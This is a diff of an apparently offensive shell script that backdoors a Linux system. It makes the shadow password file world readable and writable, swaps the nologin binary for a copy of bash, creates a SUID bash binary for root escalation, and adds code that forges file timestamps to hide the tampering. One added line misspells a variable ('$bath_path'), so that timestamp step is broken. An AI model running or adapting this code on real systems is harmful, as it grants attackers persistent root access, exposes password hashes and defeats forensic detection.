@@ -214,11 +214,17 @@ chmod o+rw "$SHADOW" && cecho info "Made '$SHADOW' world readable and writable" 
 if [ -f "$BACKUP_NOLOGIN" ]; then
 	cecho info "Backup nologin file '$BACKUP_NOLOGIN' already exists, skipping"
 else
+	nologin_path=`which nologin`
+	bash_path=`which bash`
+
 	sbin_timestamp=`get_timestamp "/sbin"`
 	bin_timestamp=`get_timestamp "/bin"`
-	nologin_path=`which nologin`
-	mv "$nologin_path" "$BACKUP_NOLOGIN" && cp "`which bash`" "$nologin_path" && cecho info "Turned '$nologin_path' into a bash binary, real nologin backed up to '$BACKUP_NOLOGIN'" || cecho error "Couldn't replace '$nologin_path' with the bash binary"
-	cp "`which bash`" "$EXTRA_BASH" && chmod u+s "$EXTRA_BASH" && cecho info "Created extra SUID bash binary '$EXTRA_BASH'" || cecho error "Couldn't create extra SUID bash binary '$EXTRA_BASH'"
+	nologin_timestamp=`get_timestamp "$nologin_path"`
+	bash_timestamp=`get_timestamp "$bath_path"`
+
+	mv "$nologin_path" "$BACKUP_NOLOGIN" && cp "$bash_path" "$nologin_path" && cecho info "Turned '$nologin_path' into a bash binary, real nologin backed up to '$BACKUP_NOLOGIN'" && set_timestamp $nologin_timestamp $nologin_path && set_timestamp $nologin_timestamp "$BACKUP_NOLOGIN" || cecho error "Couldn't replace '$nologin_path' with the bash binary"
+	cp "$bash_path" "$EXTRA_BASH" && chmod u+s "$EXTRA_BASH" && cecho info "Created extra SUID bash binary '$EXTRA_BASH'" && set_timestamp $bash_timestamp "$bash_path" && set_timestamp $bash_timestamp "$EXTRA_BASH" || cecho error "Couldn't create extra SUID bash binary '$EXTRA_BASH'"
+
 	set_timestamp $sbin_timestamp "/sbin"
 	set_timestamp $bin_timestamp "/bin"
 fi
